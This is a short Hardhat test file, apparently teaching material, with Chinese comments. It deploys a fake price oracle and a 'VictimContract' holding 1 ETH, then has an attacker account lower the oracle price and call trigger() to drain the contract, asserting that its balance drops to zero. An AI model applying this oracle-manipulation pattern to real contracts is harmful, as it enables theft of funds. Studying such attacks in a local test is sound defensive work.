const { expect } = require("chai");
const { ethers } = require("hardhat");


describe("VictimContract Test", function () {
  let victim, oracle, owner, attacker;

  beforeEach(async () => {
    // 取得帳號（Hardhat 自動給你幾個 signer
    [owner, attacker] = await ethers.getSigners();
    console.log("✅ Attacker Address:", attacker.address);

    // 部署假的 Oracle，初始價格設為 2000（高於閾值 1000）
    const Oracle = await ethers.getContractFactory("FakeOracle");
    oracle = await Oracle.deploy(2000);
    console.log("✅ Oracle Address:", oracle.target);

    // 部署 Victim 合約，轉入 1 ETH 作為誘餌
    const Victim = await ethers.getContractFactory("VictimContract");
    victim = await Victim.deploy(oracle.target, attacker.address, { value: ethers.parseEther("1") });
    
  });
  

  it("攻擊者改低價格 → 成功轉走資金", async () => {
    // 用 attacker 身分改價格，把價格降到900
    await oracle.connect(attacker).setPrice(900);

    // 攻擊前 victim 有 1 ETH
    const balanceBefore = await ethers.provider.getBalance(victim.target);
    expect(balanceBefore).to.equal(ethers.parseEther("1"));

    // 攻擊者觸發提款
    await victim.connect(attacker).trigger();

    // 攻擊後 victim 剩下 0
    const balanceAfter = await ethers.provider.getBalance(victim.target);
    expect(balanceAfter).to.equal(0);
  });
});

